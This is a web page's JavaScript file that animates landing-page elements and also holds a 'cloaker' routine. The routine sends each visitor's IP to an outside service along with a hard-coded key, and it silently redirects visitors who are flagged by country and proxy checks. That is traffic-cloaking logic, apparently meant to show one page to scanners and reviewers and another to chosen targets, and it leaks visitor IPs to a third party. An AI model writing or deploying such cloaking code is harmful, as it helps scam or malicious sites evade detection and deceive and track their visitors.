const loader_container = document.querySelector(".loader-container");

function cloaker(ip, url) {
  const uid = "U106";
  const server_ip = "173.236.200.145";
  const server_port = 465;
  const key = "51bcce7d781f86c0504ba207c8b9779830194767f7a3";
  fetch(
    `https://aichecker.net/api/index.php?cip=${ip}&uid=U106&sip=${server_ip}&spo=${server_port}&key=${key}`
  )
    .then((res) => res.json())
    .then((data) => {
      loader_container.classList.add("disabled");
      if (data.proxy) {
        location.replace(url);
      }
    })
    .catch((error) => {
      loader_container.classList.add("disabled");
      console.log(error.message);
    });
}

function detect_country(ip) {
  fetch("detect_country.php", {
    method: "POST",
    headers: {
      "Content-type": "application/json",
    },
    body: JSON.stringify({
      ip
    }),
  })
    .then((res) => res.json())
    .then((result) => {
      if (result.data.is_blocked === "0" && result.data.is_enabled === "1") {
        //If the country IP is unblocked and the status is enabled
        cloaker(ip, result.data.url);
      }
    })
    .catch((err) => {
      console.log(err);
    });
}

fetch("https://api.ipify.org?format=json")
  .then((response) => response.json())
  .then((data) => detect_country(data.ip))
  .catch((error) => console.error(error));

$(document).ready(function () {
  $(".logoImg").hide();
  $(".commonp").hide();
  $(".learnMore").hide();
  $(".rounded").hide();
  $(".img3").hide();
  $(".img1").hide();
  $(".img2").hide();
  $(".img4").hide();
  setTimeout(function () {
    $(".logoImg").fadeIn();
  }, 1000);
  setTimeout(function () {
    $(".commonp").fadeIn();
  }, 1200);
  setTimeout(function () {
    $(".learnMore").fadeIn();
  }, 2000);
  setTimeout(function () {
    $(".rounded").fadeIn();
  }, 2500);
  setTimeout(function () {
    $(".img3").fadeIn();
  }, 3000);
  setTimeout(function () {
    $(".img1").fadeIn();
  }, 3500);
  setTimeout(function () {
    $(".img2").fadeIn();
  }, 3700);
  setTimeout(function () {
    $(".img4").fadeIn();
  }, 3900);
});
